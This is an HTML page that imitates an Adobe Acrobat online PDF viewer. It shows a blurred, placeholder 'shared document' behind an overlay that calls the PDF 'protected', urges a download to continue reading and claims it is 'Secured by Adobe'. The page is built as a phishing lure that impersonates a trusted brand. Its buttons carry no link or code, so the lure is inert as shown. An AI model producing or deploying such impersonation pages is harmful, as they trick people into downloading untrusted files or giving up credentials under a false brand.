<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Document Cloud - View PDF</title>
    <link rel="icon" href="https://www.adobe.com/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: adobe-clean, 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #1b1b1b;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Toolbar */
        .toolbar {
            background: #323232;
            border-bottom: 1px solid #4a4a4a;
            padding: 8px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .toolbar-left {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .toolbar-logo {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .toolbar-logo svg {
            width: 24px;
            height: 22px;
        }

        .toolbar-logo span {
            color: #e0e0e0;
            font-size: 14px;
            font-weight: 600;
        }

        .toolbar-divider {
            width: 1px;
            height: 24px;
            background: #4a4a4a;
        }

        .toolbar-filename {
            color: #b3b3b3;
            font-size: 13px;
            max-width: 300px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .toolbar-right {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .toolbar-btn {
            background: none;
            border: 1px solid transparent;
            border-radius: 4px;
            color: #e0e0e0;
            padding: 6px 10px;
            font-size: 12px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 6px;
            transition: all 0.15s ease;
        }

        .toolbar-btn:hover {
            background: #4a4a4a;
        }

        .toolbar-btn svg {
            width: 16px;
            height: 16px;
        }

        .toolbar-btn.primary {
            background: #EB1000;
            color: #fff;
            border-color: #EB1000;
        }

        .toolbar-btn.primary:hover {
            background: #c40d00;
        }

        /* Page controls */
        .page-controls {
            background: #2b2b2b;
            padding: 6px 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            border-bottom: 1px solid #3a3a3a;
        }

        .page-controls span {
            color: #b3b3b3;
            font-size: 12px;
        }

        .page-input {
            width: 40px;
            background: #1b1b1b;
            border: 1px solid #4a4a4a;
            border-radius: 4px;
            color: #e0e0e0;
            text-align: center;
            padding: 3px;
            font-size: 12px;
        }

        .zoom-controls {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-left: 24px;
        }

        .zoom-btn {
            background: none;
            border: none;
            color: #b3b3b3;
            cursor: pointer;
            padding: 2px;
            font-size: 16px;
            line-height: 1;
        }

        .zoom-btn:hover {
            color: #e0e0e0;
        }

        /* Document viewer */
        .viewer {
            flex: 1;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 24px;
            overflow: auto;
        }

        .page-container {
            background: #ffffff;
            width: 680px;
            min-height: 880px;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
            border-radius: 2px;
            position: relative;
            overflow: hidden;
        }

        /* Blurred content simulation */
        .page-content {
            padding: 60px 56px;
            filter: blur(4px);
            user-select: none;
            pointer-events: none;
        }

        .page-content .line {
            height: 10px;
            background: #d0d0d0;
            border-radius: 5px;
            margin-bottom: 14px;
        }

        .page-content .line.short { width: 65%; }
        .page-content .line.medium { width: 82%; }
        .page-content .line.long { width: 95%; }
        .page-content .line.xshort { width: 45%; }

        .page-content .heading {
            height: 16px;
            background: #a0a0a0;
            border-radius: 8px;
            margin-bottom: 24px;
            width: 50%;
        }

        .page-content .spacer {
            height: 32px;
        }

        /* Overlay */
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.85);
            display: flex;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(2px);
        }

        .overlay-card {
            text-align: center;
            max-width: 360px;
            padding: 32px;
        }

        .overlay-icon {
            width: 56px;
            height: 56px;
            margin: 0 auto 20px;
            background: #fff3f2;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .overlay-icon svg {
            width: 28px;
            height: 28px;
        }

        .overlay-title {
            font-size: 18px;
            font-weight: 700;
            color: #2c2c2c;
            margin-bottom: 8px;
        }

        .overlay-desc {
            font-size: 14px;
            color: #6e6e6e;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .overlay-btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #EB1000;
            color: #ffffff;
            border: none;
            border-radius: 20px;
            padding: 12px 32px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s ease;
        }

        .overlay-btn:hover {
            background: #c40d00;
        }

        .overlay-btn svg {
            width: 16px;
            height: 16px;
        }

        .overlay-note {
            margin-top: 16px;
            font-size: 11px;
            color: #959595;
        }
    </style>
</head>
<body>
    <!-- Toolbar -->
    <div class="toolbar">
        <div class="toolbar-left">
            <div class="toolbar-logo">
                <svg viewBox="0 0 30 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
                    <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
                    <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
                </svg>
                <span>Acrobat</span>
            </div>
            <div class="toolbar-divider"></div>
            <span class="toolbar-filename">Shared_Document_2026.pdf</span>
        </div>
        <div class="toolbar-right">
            <button class="toolbar-btn">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M17 3a2.85 2.85 0 114 4L7.5 20.5 2 22l1.5-5.5L17 3z"/>
                </svg>
                Comment
            </button>
            <button class="toolbar-btn primary">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                    <polyline points="7 10 12 15 17 10"/>
                    <line x1="12" y1="15" x2="12" y2="3"/>
                </svg>
                Download
            </button>
        </div>
    </div>

    <!-- Page controls -->
    <div class="page-controls">
        <span>Page</span>
        <input class="page-input" type="text" value="1" readonly>
        <span>of 8</span>
        <div class="zoom-controls">
            <button class="zoom-btn">−</button>
            <span>100%</span>
            <button class="zoom-btn">+</button>
        </div>
    </div>

    <!-- Document Viewer -->
    <div class="viewer">
        <div class="page-container">
            <!-- Blurred content lines -->
            <div class="page-content">
                <div class="heading"></div>
                <div class="line long"></div>
                <div class="line long"></div>
                <div class="line medium"></div>
                <div class="line long"></div>
                <div class="line short"></div>
                <div class="spacer"></div>
                <div class="heading" style="width:35%"></div>
                <div class="line long"></div>
                <div class="line medium"></div>
                <div class="line long"></div>
                <div class="line long"></div>
                <div class="line xshort"></div>
                <div class="spacer"></div>
                <div class="line long"></div>
                <div class="line long"></div>
                <div class="line medium"></div>
                <div class="line short"></div>
                <div class="line long"></div>
                <div class="line long"></div>
                <div class="line medium"></div>
                <div class="line long"></div>
                <div class="line xshort"></div>
            </div>

            <!-- Download overlay -->
            <div class="overlay">
                <div class="overlay-card">
                    <div class="overlay-icon">
                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6z" fill="#EB1000" opacity="0.15" stroke="#EB1000" stroke-width="1.5"/>
                            <polyline points="14 2 14 8 20 8" fill="none" stroke="#EB1000" stroke-width="1.5"/>
                        </svg>
                    </div>
                    <div class="overlay-title">Download to continue reading</div>
                    <div class="overlay-desc">This PDF document is protected. Download the file to view the full content in Adobe Acrobat.</div>
                    <button class="overlay-btn">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                            <polyline points="7 10 12 15 17 10"/>
                            <line x1="12" y1="15" x2="12" y2="3"/>
                        </svg>
                        Download PDF
                    </button>
                    <div class="overlay-note">File size: 1.8 MB &middot; Secured by Adobe</div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
